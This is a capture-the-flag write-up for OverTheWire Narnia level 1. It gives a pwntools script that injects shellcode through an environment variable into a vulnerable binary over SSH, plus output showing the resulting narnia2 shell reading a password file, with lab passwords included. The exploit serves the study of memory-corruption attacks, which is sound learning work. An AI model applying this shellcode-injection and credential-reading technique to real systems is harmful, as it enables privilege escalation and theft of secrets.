# LEVEL GOAL

There is no information for this level, intentionally.

# HINTS

None

# SOLUTION

Code:
```
from pwn import *

remote_ssh = ssh('narnia1', 'narnia.labs.overthewire.org', port=2226, password='efeidiedae')
io = remote_ssh.process('sh', shell=True, env={'EGG': asm(shellcraft.sh())})

io.sendline('/narnia/narnia1')
io.interactive()
remote_ssh.close()
```

Output:
```
nikhilh@ubuntu:~/overthewire/narnia/level1$ python auth.py 
[+] Connecting to narnia.labs.overthewire.org on port 2226: Done
[*] narnia1@narnia.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[+] Starting remote process '/bin/sh' on narnia.labs.overthewire.org: pid 7969
[*] Switching to interactive mode
$ Trying to execute EGG!
$ $ whoami
narnia2
$ $ cat /etc/narnia_pass/narnia2
nairiepecu
$ $ exit
$ $ exit
[*] Got EOF while reading in interactive
$ exit
[*] Stopped remote process 'dash' on narnia.labs.overthewire.org (pid 7969)
[*] Got EOF while sending in interactive
[*] Closed connection to 'narnia.labs.overthewire.org'
```

# FLAG

nairiepecu
